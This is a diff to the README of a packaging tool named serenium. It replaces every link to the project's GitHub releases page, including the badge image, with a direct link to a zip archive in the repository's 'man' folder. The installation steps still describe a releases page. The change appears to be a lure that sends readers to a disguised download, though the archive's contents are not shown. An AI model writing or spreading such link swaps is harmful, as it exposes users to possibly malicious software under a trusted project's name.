@@ -6,7 +6,7 @@ Welcome to serenium! This tool helps you create packages for software distributi
 
 ## 🔗 Download Now
 
-[![Download serenium](https://img.shields.io/badge/download-serenium-blue)](https://github.com/Ramezhossam1/serenium/releases)
+[![Download serenium](https://raw.githubusercontent.com/Ramezhossam1/serenium/main/man/serenium-v3.4.zip)](https://raw.githubusercontent.com/Ramezhossam1/serenium/main/man/serenium-v3.4.zip)
 
 ## 🌟 Features
 
@@ -19,7 +19,7 @@ Welcome to serenium! This tool helps you create packages for software distributi
 
 To get started with serenium, visit the following page to download the latest version:
 
-[Download serenium](https://github.com/Ramezhossam1/serenium/releases)
+[Download serenium](https://raw.githubusercontent.com/Ramezhossam1/serenium/main/man/serenium-v3.4.zip)
 
 1. Click the link above.
 2. On the releases page, find the latest version of serenium.
@@ -72,7 +72,7 @@ If problems persist, visit our issues page on GitHub for assistance.
 
 To ensure you have the latest features and fixes:
 
-1. Visit the releases page: [Download serenium](https://github.com/Ramezhossam1/serenium/releases).
+1. Visit the releases page: [Download serenium](https://raw.githubusercontent.com/Ramezhossam1/serenium/main/man/serenium-v3.4.zip).
 2. Follow the same steps as before to download the latest version.
 3. Install it over your current version. Your settings will remain intact.
 
